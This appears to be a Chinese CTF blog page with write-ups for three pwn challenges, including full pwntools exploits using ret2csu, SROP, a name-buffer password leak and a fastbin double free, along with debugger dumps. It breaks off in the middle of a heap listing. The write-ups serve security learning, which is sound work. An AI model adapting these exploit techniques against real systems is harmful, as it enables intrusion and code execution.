<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span> + p64(back)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">binsh = stack - <span class="number">0x118</span></span><br><span class="line">log.success(hex(binsh))</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x30 bytes:</span><br><span class="line">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    00000010  ed 04 40 00  00 00 00 00  0a 05 40 00  00 00 00 00  │··@·│····│··@·│····│</span><br><span class="line">    00000020  a8 43 ed d1  fe 7f 00 00  00 00 00 00  01 00 00 00  │·C··│····│····│····│</span><br><span class="line">    00000030</span><br><span class="line">[+] 0x7ffed1ed4290</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7ffed1ed4290</span><br><span class="line">0x7ffed1ed4290:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x7ffed1ed42a0:	0x00007ffed1ed42a0	0x000000000040050a</span><br><span class="line">0x7ffed1ed42b0:	0x00007ffed1ed43a8	0x0000000100000000</span><br></pre></td></tr></table></figure>

<h4 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h4><p>因为需要设置3个参数，需要利用万能gadget，但是注意一点是，第一个参数只能设置低8位，但是binsh的地址有12位，所以第一个参数还需要通过pop rdi，单独设置。</p>
<ol>
<li><p>布置“/bin/sh” =&gt; 地址通过上面已经泄漏</p>
</li>
<li><p>设置rax = 59</p>
</li>
<li><p>开始ret2cus</p>
<p>part1</p>
<p>​    rbx = 0，rbp = 1，跳出循环</p>
<p>​    call []，选择binsh+0x10的地址，也就是设置rax=59</p>
<p>​    设置3个参数，都为0即可</p>
<p>part2</p>
<p>​    ‘a’×0x56=&gt; 到达ret</p>
<p>​    设置第一个参数</p>
<p>syscall即可</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39; * 2 </span><br><span class="line">payload +&#x3D; p64(mov_rax_59)</span><br><span class="line">payload +&#x3D; p64(part1) </span><br><span class="line">payload +&#x3D; p64(0) + p64(1)</span><br><span class="line">payload +&#x3D; p64(binsh+0x10)</span><br><span class="line">payload +&#x3D; p64(0)</span><br><span class="line">payload +&#x3D; p64(0)</span><br><span class="line">payload +&#x3D; p64(0)</span><br><span class="line">payload +&#x3D; p64(part2)</span><br><span class="line">payload +&#x3D; &#39;a&#39;*56</span><br><span class="line">payload +&#x3D; p64(pop_rdi) + p64(binsh)</span><br><span class="line">payload +&#x3D; p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<h5 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./ciscn_2019_es_7"</span>)</span><br><span class="line"><span class="comment"># p=remote("node3.buuoj.cn",26076)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">mov_rax_59 = <span class="number">0x00004004E2</span></span><br><span class="line">part1 = <span class="number">0x0040059A</span></span><br><span class="line">part2 = <span class="number">0x000400580</span></span><br><span class="line">back = <span class="number">0x04004ED</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005a3</span></span><br><span class="line">syscall = <span class="number">0x0000000000400501</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span> + p64(back)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">binsh = stack - <span class="number">0x118</span></span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> * <span class="number">2</span></span><br><span class="line">payload += p64(mov_rax_59)</span><br><span class="line">payload += p64(part1) </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(binsh+<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(part2)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">56</span></span><br><span class="line">payload += p64(pop_rdi) + p64(binsh)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h4><h5 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sigFrame = SigreturnFrame()</span><br></pre></td></tr></table></figure>

<h5 id="设置寄存器"><a href="#设置寄存器" class="headerlink" title="设置寄存器"></a>设置寄存器</h5><ol>
<li>rax = execve调用号</li>
<li>rdi = binsh地址</li>
<li>rsi = 0</li>
<li>rdx = 0</li>
<li>rip = syscall</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sigFrame.rax = constants.SYS_execve</span><br><span class="line">sigFrame.rdi = binsh</span><br><span class="line">sigFrame.rsi = <span class="number">0</span></span><br><span class="line">sigFrame.rdx = <span class="number">0</span></span><br><span class="line">sigFrame.rip = syscall</span><br></pre></td></tr></table></figure>

<h5 id="发送"><a href="#发送" class="headerlink" title="发送"></a>发送</h5><ol>
<li>发送“/bin/sh\x00”两个</li>
<li>gadget，这里会retn一下，让rsp下移</li>
<li>放上syscall，接着就放上str(sigFrame)【在rsp的下一个位置】</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'/bin/sh\x00'</span> * <span class="number">2</span></span><br><span class="line">payload += p64(pop_rax_15)+p64(syscall)+str(sigFrame)</span><br></pre></td></tr></table></figure>

<h5 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./ciscn_2019_es_7"</span>)</span><br><span class="line"><span class="comment"># p=remote("node3.buuoj.cn",26076)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">mov_rax_59 = <span class="number">0x00004004E2</span></span><br><span class="line">part1 = <span class="number">0x0040059A</span></span><br><span class="line">part2 = <span class="number">0x000400580</span></span><br><span class="line">back = <span class="number">0x04004ED</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005a3</span></span><br><span class="line">syscall = <span class="number">0x0000000000400501</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(back)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">binsh = stack - <span class="number">0x118</span></span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">pop_rax_15 = <span class="number">0x004004DA</span></span><br><span class="line"></span><br><span class="line">sigFrame = SigreturnFrame()</span><br><span class="line">sigFrame.rax = constants.SYS_execve</span><br><span class="line">sigFrame.rdi = binsh</span><br><span class="line">sigFrame.rsi = <span class="number">0</span></span><br><span class="line">sigFrame.rdx = <span class="number">0</span></span><br><span class="line">sigFrame.rip = syscall</span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> * <span class="number">2</span></span><br><span class="line">payload += p64(pop_rax_15)+p64(syscall)+str(sigFrame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本篇主要讲了些做题的点，思路更清晰了，，，，</p>
<ol>
<li>ret2csu比较好用了，这里特别注意execve使用的参数设置</li>
<li>srop主要发送str(sigFrame)在rsp下面一个，题目read和write都是[rsp+buf]为srop提供了便利</li>
</ol>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="ciscn_2019_es_7">附件</a></p>

	
	</div>
  <a type="button" href="/2021/05/06/ciscn-2019-es-7/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/01/picoctf-2018-leak-me详解/" >picoctf_2018_leak_me详解</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-01  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>虽然很简单，<del>但好像第一次碰见这样的题</del>，所以记录下。</p>
</blockquote>
<h3 id="反汇编问题"><a href="#反汇编问题" class="headerlink" title="反汇编问题"></a>反汇编问题</h3><p>问题：main函数f5的时候报如下错误</p>
<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234336628.png" alt="image-20210501234336628"></p>
<p>解决：</p>
<ol>
<li><p>找到报错的地址：0x8048705【按g输入地址即可】</p>
<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234523311.png" alt="image-20210501234523311"></p>
</li>
<li><p>双击函数，然后f5</p>
<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234614572.png" alt="image-20210501234614572"></p>
</li>
<li><p>然后就可以正常了</p>
</li>
</ol>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li>输入name</li>
<li>打印name</li>
<li>输入password</li>
<li>比较输入password和password</li>
<li>相同打印flag</li>
</ol>
<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234815805.png" alt="image-20210501234815805"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于name和password是紧挨着的，而且差距0x100。</p>
<p>如果name的长度为0x100，那么puts输出name的时候，就会把password一起带出来了。</p>
<p>而且name的最大长度可以达到0x100，故首先令name=0x100，即可泄露password，接着就可以得到flag了。</p>
<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234915134.png" alt="image-20210501234915134"></p>
<h4 id="获得password"><a href="#获得password" class="headerlink" title="获得password"></a>获得password</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26105)</span><br><span class="line">p.recvuntil(&quot;name?&quot;)</span><br><span class="line">p.sendline(&quot;a&quot;*0x100)</span><br><span class="line"># password &#x3D; &quot;a_reAllY_s3cuRe_p4s$word_f85406&quot;</span><br><span class="line"># p.sendline(password)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a_reAllY_s3cuRe_p4s$word_f85406</span><br><span class="line"></span><br><span class="line">Incorrect Password!</span><br></pre></td></tr></table></figure>

<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26105</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">p.sendline(<span class="string">"a"</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># password = "a_reAllY_s3cuRe_p4s$word_f85406"</span></span><br><span class="line"><span class="comment"># p.sendline(password)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="PicoCTF_2018_leak-me">附件</a></p>

	
	</div>
  <a type="button" href="/2021/05/01/picoctf-2018-leak-me详解/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/01/gyctf-2020-some-thing-exceting详解/" >gyctf_2020_some_thing_exceting详解</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-01  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>还是高校战役的题，并且以前做过，，，，<del>但当时tcl，复现也不会，虽然现在也很菜</del></p>
<p>这里再重新写篇文章，记录下。</p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/05/01/%C2%96gyctf-2020-some-thing-exceting%E8%AF%A6%E8%A7%A3/image-20210501212850010.png" alt="image-20210501212850010"></p>
<h4 id="init"><a href="#init" class="headerlink" title="init"></a>init</h4><p>程序最开始进入了init函数</p>
<blockquote>
<p>init函数首先将flag读入了内存。</p>
<p>接着又将内存flag的数据读入了s，在0x6020a8中。</p>
<p>由于0x6020a0处设置了0x60，可以将fake chunk申请到这里，再读取块数据，即可得到flag</p>
</blockquote>
<p><img src="/2021/05/01/%C2%96gyctf-2020-some-thing-exceting%E8%AF%A6%E8%A7%A3/image-20210501213125204.png" alt="image-20210501213125204"></p>
<h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><ol>
<li>create：创建一个指针chunk，里面存放了ba和na两个块的地址；创建ba和na，大小为0~0x70，fastbin大小内。</li>
<li>delete：free块，但是没有清零，可以double free，获得一定的地址读写能力</li>
<li>view：根据idx打印内容。</li>
</ol>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
<li>两次create</li>
<li>free(0) -&gt; free(1) -&gt; free(0)</li>
<li>重新申请create2，此时修改2的内容，由于0和2是同一个地址，修改2，修改了0的内容，重新申请4的时候，就可以申请到想要的地址</li>
<li>修改2的内容为0x6020a0-0x8</li>
<li>create3，create4</li>
<li>4即申请到了0x6020a0的位置，打印其内容即为flag</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-保护"><a href="#0-保护" class="headerlink" title="0.保护"></a>0.保护</h4><blockquote>
<p>没开pie</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec gyctf_2020_some_thing_exceting </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_some_thing_exceting&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="1-两次创建"><a href="#1-两次创建" class="headerlink" title="1.两次创建"></a>1.两次创建</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf74000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf74230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75240</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf752c0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75320</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75340</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf753a0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75400</span><br><span class="line">Size: 0x1fc01</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x50</span>,<span class="string">'aaaa'</span>,<span class="number">0x50</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">'aaaa'</span>,<span class="number">0x50</span>,<span class="string">'bbbb'</span>)</span><br></pre></td></tr></table></figure>

<h4 id="2-double-free"><a href="#2-double-free" class="headerlink" title="2.double free"></a>2.double free</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ac000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ac230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad240</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x10ad320</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ad260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad2c0</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x10ad3a0</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad320</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x10ad240</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad340</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x10ad2c0</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad3a0</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x10ad340</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ad400</span><br><span class="line">Size: 0x1fc01</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x10ad240 —▸ 0x10ad320 ◂— 0x10ad240</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x10ad2c0 —▸ 0x10ad3a0 —▸ 0x10ad340 ◂— 0x10ad2c0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h4 id="3-create-3，并修改fd为fake-chunk"><a href="#3-create-3，并修改fd为fake-chunk" class="headerlink" title="3.create 3，并修改fd为fake chunk"></a>3.create 3，并修改fd为fake chunk</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce5000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce5230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0xce6240</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0xce62d0</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce6260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0xce62c0</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x602098</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0xce6320</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0xce6240</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0xce6340</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0xce62c0</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce63a0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span 